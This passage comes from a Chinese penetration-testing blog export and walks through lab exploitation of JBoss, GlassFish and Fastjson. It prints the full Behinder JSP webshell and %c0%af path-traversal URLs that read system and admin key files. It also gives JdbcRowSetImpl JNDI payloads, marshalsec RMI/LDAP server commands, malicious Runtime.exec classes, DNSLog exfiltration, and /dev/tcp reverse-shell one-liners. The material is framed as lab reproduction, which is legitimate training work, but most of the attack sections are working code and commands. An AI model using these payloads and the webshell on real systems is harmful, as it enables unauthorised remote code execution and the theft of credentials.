配置成功\n\n\n\n![1619491136856](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491136856.png)\n\n\n\n本地访问一下\n\n\n\n![1619491203863](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491203863.png)\n\n\n\n配置远程登录\n\n\n\n```\nC:\\jboss-4.2.3.GA\\server\\default\\deploy\\jboss-web.deployer\n```\n\n\n\n\n\n![1619491306567](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491306567.png)\n\n\n\n![1619491370434](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491370434.png)\n\n\n\n```\n将address=\"${jboss.bind.address}\"-->address=\"0.0.0.0\"\n```\n\n保存退出 重启一下run.bat\n\n\n\nkali远程访问\n\n\n\n![1619491472926](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491472926.png)\n\n\n\n## 验证漏洞\n\n```\n/jbossmq-httpil/HTTPServerILServlet\n```\n\n\n\n\n\n![1619491523601](https://gitee.com/work-hard-every-day/test/raw/master/img/1619491523601.png)\n\n\n\n说明是存在漏洞\n\n\n\n### 漏洞利用\n\n```\ncurl http://192.168.175.196:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @\nReverseShellCommonsCollectionsHashMap.ser\n```\n\n\n\n![1619499269483](https://gitee.com/work-hard-every-day/test/raw/master/img/1619499269483.png)\n\n\n\n\n\n\n\n![1619499250210](https://gitee.com/work-hard-every-day/test/raw/master/img/1619499250210.png)\n\n\n\n### 修复建议\n\n升级版本！\n\n\n\n## JBoss EJBlnvokerServle反序列化漏洞(CVE-2013-4810）\n\n### 验证漏洞\n\n```\n/invoker/EJBInvokerServle\n```\n\n能返回结果 就可以利用\n\n\n\n## Administration Console弱口令\n\nAdministration Console管理页面存在弱口令\n\n\n\n存在管理界面\n\n\n\n![1619500280595](https://gitee.com/work-hard-every-day/test/raw/master/img/1619500280595.png)\n\n\n\n弱口令：\n\nadmin：admin\n\n\n\n然后没有验证码 可以爆破\n\n\n\n登陆后台上传war包！\n\n\n\n这里有上传按钮\n\n\n\n![1619500962012](https://gitee.com/work-hard-every-day/test/raw/master/img/1619500962012.png)\n\n\n\n\n\n这边用冰蝎的马儿 进行打包war  上传\n\n\n\n![1619501373965](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501373965.png)\n\n\n\n那么上传目录\n\n就是war包名所在的文件夹\n\n```\n/shell/shell.jsp\n```\n\n\n\n\n\n\n\n![1619501480638](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501480638.png)\n\n\n\n\n\n\n\n\n\n\n\n![1619501724403](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501724403.png)\n\n\n\n\n\n![1619501693853](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501693853.png)\n\n\n\n### 修复建议\n\n#### 1.修改密码\n\n默认密码的位置\n\n\n\n```\nC:\\JBoss6\\jboss-6.1.0.Final\\server\\default\\conf\\props\n```\n\n\n\n![1619501855534](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501855534.png)\n\n\n\n\n\n![1619501876281](https://gitee.com/work-hard-every-day/test/raw/master/img/1619501876281.png)\n\n\n\n\n\n#### 2.删除 Administration Console页面\n\nJboss版本>=6.0，Administration Console页面路径为\n\n```\nC:\\jboss-6.1.0.Final\\common\\deploy\\admin-console.war\n```\n\n\n\n6.0之前的版本\n\n```\nC:\\jboss-4.2.3\\server\\default\\deploy\\management\\console-mgr.sar\\web-console.war\n```\n\n\n\n## 低版本 JMX Console未授权访问\n\n### 漏洞原理\nJMX Console是Jboss管理控制台，访问控制不严导致的漏洞！\n\nJboss 4.x及其之前的版本 console管理路径为/jmx-console/和/web-console/！\n\n- jmx-console的配置文件为\n\n```\n/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml\n#jboss的绝对路径不同网站不一样\n```\n\n\n\n- Web-Conso|e的配置文件为\n\n```\n/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war\n/WEB-INF/jboss-web.xml\n#jboss的绝对路径不同网站不一样\n```\n\n- 控制台账号密码\n- jmx-console和web-console共用一个账号密码，账号密码文件在\n\n```\n/opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties\n```\n\n\n\n### 漏洞利用\n\n\n\n![1619511607443](https://gitee.com/work-hard-every-day/test/raw/master/img/1619511607443.png)\n\n\n\n![1619511690973](https://gitee.com/work-hard-every-day/test/raw/master/img/1619511690973.png)\n\n\n\n保存的路径\n\n\n\n![1619511810391](https://gitee.com/work-hard-every-day/test/raw/master/img/1619511810391.png)\n\n\n\n继续往下翻\n\n\n\n![1619511744704](https://gitee.com/work-hard-every-day/test/raw/master/img/1619511744704.png)\n\n\n\n远程war包部署\n\n\n\n```\nservice apache2 start\npython -m SimpleHTTPServer 9999\n```\n\n\n\n自己本地访问一下 发现是可以的\n\n\n\n![1619596539216](https://gitee.com/work-hard-every-day/test/raw/master/img/1619596539216.png)\n\n\n\n![1619596279104](https://gitee.com/work-hard-every-day/test/raw/master/img/1619596279104.png)\n\n\n\n\n\n\n\n![1619596609992](https://gitee.com/work-hard-every-day/test/raw/master/img/1619596609992.png)\n\n\n\n\n\n\n\n\n\n\n\n部署成功\n\n\n\n查看部署情况 这里要点击一下 Apply Changes 进行部署\n\n\n\n然后在jboss.web.dep\n\n\n\n\n\n\n\n## 高版本JMX Console未授权访问\n\n### 漏洞利用\n\n\n\n![1619566650837](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566650837.png)\n\n\n\n![1619566687530](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566687530.png)\n\n部署地址\n\n\n\n![1619566759737](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566759737.png)\n\n\n\n\n\n查看框架的源代码 我们要找的是`methodIndex`为`17/19`的 deploy,填写远程war包的地址进行远程部署\n\n\n\n![1619566920905](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566920905.png)\n\n\n\n![1619566941997](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566941997.png)\n\n\n\n对应的是\n\n\n\n![1619566961392](https://gitee.com/work-hard-every-day/test/raw/master/img/1619566961392.png)\n\n\n\n部署成功后 进行点击\n\n```\nhttp://192.168.175.194:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.syst\nem:service=MainDeployer&methodIndex=17&arg0=http://xxxx/1.war\n```\n\n然后冰蝎进行远程连接 就可\n\n本地检查 部署的文件\n\n路径：\n\n```\nC:\\jboss-6.1.0.Final\\server\\default\\work\\jboss.web\\localhost\n```\n\n\n\n### 漏洞复现\n\n定位到store的位置\n\n```\nhttp://192.168.175.196:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository\n```\n\n通过向store的四个参数传入信息 达到上传shell\n\n\n\n![1619580666827](https://gitee.com/work-hard-every-day/test/raw/master/img/1619580666827.png)\n\n\n\n```\n\n```\n\n\n\n这里上传冰蝎的jsp木马\n\n```jsp\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n```\n\n\n\n```\n/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/\n```\n\n\n\n\n\n![1619580826442](https://gitee.com/work-hard-every-day/test/raw/master/img/1619580826442.png)\n\n\n\n![1619580855423](https://gitee.com/work-hard-every-day/test/raw/master/img/1619580855423.png)\n\n\n\n这边写一个情况\n\n本地测试之后 发现上传的文档 在这里\n\n\n\n![1619580914678](https://gitee.com/work-hard-every-day/test/raw/master/img/1619580914678.png)\n\n\n\n在这个目录下 有问题\n\n\n\n\n\n## 自动化渗透\n\n```\nsudo pip install -r requires.txt\n```\n\n![1619568126765](https://gitee.com/work-hard-every-day/test/raw/master/img/1619568126765.png)\n\n\n\n执行命令 拿jboss4举例\n\n\n\n```\npython jexboss.py -host http://192.168.175.196:8080\n```\n\n\n\n进行利用 就可以了\n\n\n\n![1619568214558](https://gitee.com/work-hard-every-day/test/raw/master/img/1619568214558.png)","tags":["Jboss总结"],"categories":["服务攻防"]},{"title":"GlassFish总结","url":"/2021/06/22/GlassFish/","content":"\n**GlassFish**\n\n<!--more-->\n\n## 安装\n\n使用Win7进行安装\n\n官网：[GlassFish (javaee.github.io)](https://javaee.github.io/glassfish/download)\n\n基于java的 所以先安装java\n\njava6以上的版本就可以\n\n\n\n\n\n![image-20210507195328973](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507195328973.png)\n\n\n\n配置环境变量\n\n\n\n![image-20210507195515152](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507195515152.png)\n\n\n\n启动GlassFish cmd命令窗口\n\n\n\n```\nasadmin start-domain 启动glassfish \nasadmin stop-domain 停止glassfish\n```\n\n\n\n![image-20210507195858085](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507195858085.png)\n\n\n\n远程访问一下\n\n\n\n![image-20210507200034670](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507200034670.png)\n\n这个报错是安全机制的问题 \n\n\n\n可以看到它默认只需要账号和密码 不需要验证码\n\n\n\n## 渗透\n\n### GlassFish Directory Traversal(CVE-2017-1000028)\n\n\n\n%c0%af解析为\n\n\n\n`..%c0%af..%c0%af`来向上跳转 达到目录穿越，任意文件读取\n\n#### 影响版本\n\n<=4.1.2版本\n\n### 漏洞复现\n\n启动GlassFish后访问：\n\n```\nhttp://192.168.175.211:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af\n..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/wi\nn.ini\n```\n\n\n\n\n\n![image-20210507203122742](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507203122742.png)\n\n这里我读取的是这个文件\n\n\n\n![image-20210507203234861](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507203234861.png)\n\n\n\n\n\n![image-20210507203212105](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507203212105.png)\n\n\n\n### 分析原理\n\n\n\n去目录下面\n\n```\nC:\\glassfish4\\glassfish\\domains\\domain1\\config\n```\n\n\n\n\n\n![image-20210507210545079](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507210545079.png)\n\n\n\n![image-20210507211042918](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507211042918.png)\n\n\n\n它的账号和密码\n\n```\nadmin;{SSHA256}3rLwuo4vc/6aAcpK4eJiU6M3+GgkIA4nJfS8C1JXfoDGnXE9AOeyvQ==;asadmin\n```\n\n\n\n破解它的密码的话 推荐一个大佬的博客：http://www.anquanke.com/post/id/85948\n\n\n\n我们根据这个目录再去读取一下它的这个文件\n\n\n\n```\nhttp://192.168.175.211:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%a\nf..%c0%afdomains\\domain1\\config\\admin-keyfile\n```\n\n\n\n![image-20210507211204956](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507211204956.png)\n\nLinux下的话\n\n\n\n```\nhttp://ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/\n%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%\nae%c0%ae/etc/passwd\n```\n\n\n\n注意：测试过程中自行添加：`%..c0%af`\n\n\n\n### GlassFish后台getshell\n\n\n\n涉及到之前所提的报错-->安全机制的问题\n\n\n\n```\nasadmin change-admin-password\n```\n\n进行密码修改 默认admin是空密码\n\n\n\n![image-20210507212725759](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507212725759.png)\n\n\n\n 重新启动后，远程访问一下\n\n\n\n![image-20210507212856487](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507212856487.png)\n\n\n\n![image-20210507212951471](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507212951471.png)\n\n\n\n然后继续去设置安全机制\n\n\n\n简单来讲就是http-->https\n\n\n\n```\nasadmin enable-secure-admin\n```\n\n\n\n\n\n![image-20210507213059167](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507213059167.png)\n\n\n\n重启然后重新访问一下\n\n\n\n弹出安全机制\n\n\n\n![image-20210507213453560](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507213453560.png)\n\n\n\n![image-20210507213511668](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507213511668.png)\n\n\n\n进行登录\n\n\n\n![](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507214613487.png)\n\n### 漏洞复现\n\n\n\n![image-20210507214646441](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507214646441.png)\n\n\n\n\n\n制作war包进行上传\n\n\n\n![image-20210507214858151](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507214858151.png)\n\n\n\n\n\n路径可以自己改\n\n\n\n![image-20210507215008753](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507215008753.png)\n\n\n\n这边我是默认的\n\n\n\n![image-20210507215031118](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507215031118.png)\n\n\n\n进行测试\n\n\n\n```\nhttp://192.168.175.211:8080/a001/a001.jsp\n```\n\n\n\n\n\n![image-20210507215231409](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507215231409.png)\n\n报错 进行解决一下\n\n\n\n```\nasadmin\nset \"server.java-config.java-home=C:\\Program Files\\Java\\jdk1.7.0_80\"\n```\n\n\n\n![image-20210507221029031](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507221029031.png)\n\n\n\n输入账号密码\n\n\n\n![image-20210507221100650](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507221100650.png)\n\n\n\n\n\n重新访问一下\n\n\n\n![image-20210507221345941](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210507221345941.png)\n\n","tags":["GlassFish总结"],"categories":["服务攻防"]},{"title":"Fastjson总结","url":"/2021/06/22/Fastjson/","content":"\n**Fastjson**\n\n<!--more-->\n\n# Fastjson简介\n\n所有的包：\n\n```\nhttps://github.com/alibaba/fastjson\n```\n\n## 1.JNDI简介\n\n## 2.JNDI References进行注入\n\n### RMI的作用\n\n# 自行搭建Fastjson\n\n要添加的jar包：https://mvnrepository.com/artifact/com.alibaba/fastjson\n\n\n\n![image-20210603075858384](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603075858384.png)\n\n\n\n安装Java版本 \n\n注意不要安装java1.8u191之后的版本\n\n全版本下载：https://www.oracle.com/java/technologies/oracle-java-archive-downloads.html\n\n\n\n![image-20210603075205220](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603075205220.png)\n\n\n\n安装IDEA\n\n全部默认安装即可\n\n\n\n![image-20210603072947211](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603072947211.png)\n\n\n\n不用管\n\n\n\n![image-20210603073005448](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603073005448.png)\n\n\n\n安装完成\n\n\n\n![image-20210603074518749](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603074518749.png)\n\n\n\n启动\n\n![image-20210603074618943](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603074618943.png)\n\n\n\n![image-20210603074654004](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603074654004.png)\n\n\n\n![image-20210603074708337](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603074708337.png)\n\n\n\n创建项目\n\n![image-20210603074746231](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603074746231.png)\n\n\n\n![image-20210603080030162](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080030162.png)\n\n\n\n\n\n全部×掉后\n\n\n\n![image-20210603080147645](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080147645.png)\n\n\n\n它在安装需要的包 等一下\n\n## 1.导入fastjson中jar的包\n\n搞一个新的文件夹 放jar包\n\n\n\n![image-20210603080525553](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080525553.png)\n\n\n\n直接拖入\n\n\n\n![image-20210603080618896](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080618896.png)\n\n\n\n然后进行调用\n\n\n\n![image-20210603080710691](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080710691.png)\n\n\n\n![image-20210603080751426](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080751426.png)\n\n\n\n![image-20210603080848574](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080848574.png)\n\n\n\n\n\n![image-20210603080914572](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603080914572.png)\n\n\n\n然后ok即可\n\n\n\n## 2.加载fastjson包并运行\n\n学过java的代码审计 就会很懂这个\n\n![image-20210603081337608](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603081337608.png)\n\n\n\n放入pom.xml文件中\n\n\n\n![image-20210603081414365](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603081414365.png)\n\n\n\n然后更新pom.xml\n\n\n\n![image-20210603081502054](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603081502054.png)\n\n\n\n# Fastjson代码实践一下\n\nDemo.java\n\n```java\nimport com.alibaba.fastjson.JSON;\n\npublic class Demo {\n    public static void main(String[] args){\n        User user = new User();\n        user.setName(\"ୟӣ\");\n        user.setAge(18);\n        String jsonStr = JSON.toJSONString(user);\n        System.out.printf(jsonStr);\n    }\n}\n```\n\n\n\nUser.java\n\n```java\npublic class User {\n    private String name;\n    private Integer age;\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n    public Integer getAge() {\n        return age;\n    }\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n\n\n\n\n\n\n![image-20210603082807323](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603082807323.png)\n\n\n\n\n\n执行Demo.java\n\n\n\n![image-20210603082740826](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603082740826.png)\n\n\n\n# Spring+Fastjson\n\n\n\n\n\n![image-20210603083111198](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603083111198.png)\n\n\n\n\n\n![image-20210603083135148](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603083135148.png)\n\n\n\n![image-20210603083156772](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603083156772.png)\n\n\n\n然后选择一个新窗口\n\n它在下载Spring的包，等一下\n\n\n\n![image-20210603083250299](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603083250299.png) \n\n\n\n把Fastjson需要的jar包放入pom.xml中\n\n![image-20210603085051832](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603085051832.png)\n\n\n\n然后创建一个Demo.java文件\n\n\n\n![image-20210603083917438](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603083917438.png)\n\n\n\nDemo.java文件内容\n\n```java\npackage com.example.demo;\nimport com.alibaba.fastjson.JSON;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class Demo {\n    @GetMapping(\"/a001\")\n    public String a001test(){\n        User user = new User();\n        user.setName(\"ୟӣ\");\n        user.setAge(18);\n        String jsonStr = JSON.toJSONString(user);\n        return jsonStr;\n    }\n}\n```\n\n\n\n\n\n把User.java拷贝过来\n\n\n\n![image-20210603084538783](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603084538783.png)\n\n\n\n\n\n![image-20210603084553162](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603084553162.png)\n\n\n\n运行Demo.java\n\n可以看到版本信息\n\n\n\n![image-20210603085307293](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603085307293.png)\n\n\n\n远程访问一下 \n\n\n\n![image-20210603085540557](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603085540557.png)\n\n\n\n可以看到部署完成了\n\n\n\n![image-20210603085604038](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603085604038.png)\n\n\n\n正常回显\n\n\n\n修改端口 在这里\n\n\n\n![image-20210603090010345](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603090010345.png)\n\n\n\n保存 重启Demo.java\n\n\n\n![image-20210603090100255](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603090100255.png)\n\n\n\n# Fastjson渗透\n\n## LDAP和RMI对jdk的要求\n\n\n\n![image-20210603212713821](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603212713821.png)\n\n\n\n## Faston1.2.24反序列化导致任意命令执行漏洞(CVE-2017-18349)\n\n### 漏洞搭建\n\n还是使用p牛的靶场 进行复现\n\n\n\n```\ncd vulhub-master/fastjson/1.2.24-rce\nsudo docker-compose up -d\nsudo docker ps\n```\n\n\n\n### 漏洞检测\n\n```\ncurl http://192.168.175.209:8090/ -H \"Content-Type: application/json\" --data '{\"name\":\"a001\", \"age\":20}'\n```\n\n![image-20210603154810163](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603154810163.png)\n\n\n\n\n\n### 漏洞复现\n\n访问一下\n\n```\nhttp://192.168.175.209:8090/\n```\n\n\n\n\n\n![image-20210603125359678](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603125359678.png)\n\n\n\n去docker底层看看java版本\n\n\n\n![image-20210603094452406](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603094452406.png)\n\n\n\n那么可以看到java的版本是1.8.0_102 那么是可以rmi的\n\n编译恶意类代码\n\n安装javac环境\n\n```\ncd /opt\ncurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz\ntar zxvf jdk-8u20-linux-x64.tar.gz\nrm -rf /usr/bin/java*\nln -s /opt/jdk1.8.0_20/bin/j* /usr/bin\njavac -version\njava -version\n```\n\n\n\n![image-20210603160212099](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603160212099.png)\n\n\n\na001.java\n\n```\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class a001{\n\tstatic {\n\t\ttry {\n\t\t\tRuntime rt = Runtime.getRuntime();\n\t\t\tString[] commands = {\"touch\", \"/tmp/a001\"};\n\t\t\tProcess pc = rt.exec(commands);\n\t\t\tpc.waitFor();\n\t\t} catch (Exception e) {\n\t\t\t// do nothing\n\t\t}\n\t}\n}\n```\n\n\n\n![image-20210603160437651](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603160437651.png)\n\n\n\n进行编译\n\n![image-20210603160518798](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603160518798.png)\n\n\n\npython开启服务\n\n```\npython -m SimpleHTTPServer 80\n```\n\n\n\n![image-20210603165310520](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165310520.png)\n\n\n\n### 编译和开启Rmi服务\n\n下载marshalsec\n\n```\ngit clone https://github.com/mbechler/marshalsec.git\n```\n\n安装maven\n\n```\napt-get install maven\n```\n\n![image-20210603163020902](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603163020902.png)\n\n\n\n然后使用 maven编译 marshalsec成jar包\n\n```\nmvn clean package -DskipTests\n```\n\n\n\n![image-20210603163618061](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603163618061.png)\n\n\n\n![image-20210603164348476](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603164348476.png)\n\n\n\n\n\n![image-20210603164445796](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603164445796.png)\n\n\n\n然后我们借助 marshalsec项目，启动一个RMI服务器，监听8888端口，并制定加载远程类a001.class\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.175.130/#a001\" 6666\n```\n\n![image-20210603165334235](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165334235.png)\n\n\n\n### Poc\n\n进行抓包\n\n\n\n![image-20210603164138980](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603164138980.png)\n\n转换成POST包\n\n```\n{\n    \"b\":{\n    \t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n \t\t\"dataSourceName\":\"rmi://192.168.253.9:9999/dayu\",\n \t\t\"autoCommit\":true\n \t}\n}\n```\n\n\n\n进行执行\n\n\n\n![image-20210603165435425](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165435425.png)\n\n\n\n\n\n\n\n\n\n![image-20210603165404029](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165404029.png)\n\n\n\n![image-20210603165415426](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165415426.png)\n\n\n\n去docker底层查看是否成功\n\n\n\n![image-20210603165551187](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603165551187.png)\n\n\n\n成功创建\n\n### DNSLog回显\n\n[DNSLog Platform](http://www.dnslog.cn/)\n\n\n\n![image-20210603170952557](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603170952557.png)\n\n\n\n```\n\"/bin/sh\",\"-c\",\"ping user.'whoami'.24r9fg.dnslog.cn\"\n```\n\n\n\n![image-20210603171123501](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603171123501.png)\n\n\n\n重新生成a001.class\n\n\n\n![image-20210603171410645](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603171410645.png)\n\n\n\n![image-20210603171425204](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603171425204.png)\n\n\n\n重新执行一下\n\n\n\n![image-20210603171538855](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603171538855.png)\n\n\n\n成功回显\n\n\n\n### 反弹shell\n\n```\n\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/x.x.x.x/1234;cat <&5 | while read line; do $line 2>&5 >&5; done\"\n或者\n\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/x.x.x.x/1234\"\n```\n\n重新编译a001.java文件\n\n![image-20210603172019657](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603172019657.png)\n\n\n\n![image-20210603172035283](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603172035283.png)\n\n\n\n![image-20210603172139172](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603172139172.png)\n\n\n\n\n\nnc开启监听 重新执行\n\n\n\n![image-20210603172224294](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603172224294.png)\n\n\n\n成功拿到反弹shell\n\n### Windows复现\n\n#### 漏洞验证一、\n\n```\ncurl http://192.168.253.112:8080/fastjson -H \"Content-Type: application/json\" --data '{\"name\":\"a001\", \"age\":20}'\n```\n\n\n\n#### 漏洞验证二、\n\n```\n{\n \"@type\": \"com.example.demo.model.User\",\n \"name\": \"a001\",\n \"age\": 22,\n \"id_card\": \"12121\"\n}\n```\n\n记得是json格式\n\n\n\n#### Exploit.java\n\n```\npublic class Exploit {\n public Exploit (){\n try{\n Runtime.getRuntime().exec(\"calc\");\n }catch (Exception e){\n e.printStackTrace();\n }\n }\n public static void main(String[] argv){\n Exploit e = new Exploit(); }\n}\n```\n\n#### 借助 marshalsec项目\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.175.130/#Exploit\" 9999\n```\n\n#### 抓包执行Poc\n\n```\n{\n \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://192.168.175.130/Exploit\",\n \"autoCommit\":true\n}\n```\n\n\n\n\n\n## Fastjson1.2.47远程命令执行漏洞\n\n### 影响版本\n\n```\nFastjson < 1.2.47\n```\n\n### 漏洞搭建\n\n依然选择P牛的靶场\n\n```\ncd vulhub-master/fastjson/1.2.47-rce\nsudo docker-compose up -d \n```\n\n\n\n![image-20210603182724439](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603182724439.png)\n\n\n\n去docker底层看看java版本\n\n\n\n![image-20210603183047820](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603183047820.png)\n\n\n\n### 漏洞复现\n\n```\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class a002 {\n    static {\n \t\ttry {\n \t\tRuntime rt = Runtime.getRuntime();\n \t\tString[] commands = {\"touch\", \"/tmp/a002\"};\n\t \tProcess pc = rt.exec(commands);\n \t\tpc.waitFor();\n \t} catch (Exception e) { // do nothing\n \t\t}\n \t}\n}\n```\n\n\n\n![image-20210603183223007](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603183223007.png)\n\n\n\n进行编译\n\n\n\n![image-20210603183431714](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603183431714.png)\n\n\n\npython开启HTTP服务\n\n\n\n![image-20210603184333535](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603184333535.png)\n\n\n\n使用marshalsec项目，启动一个RMI服务器，监听6666端口，并制定加载远程类a002.class\n\n\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.175.130/#a002\" 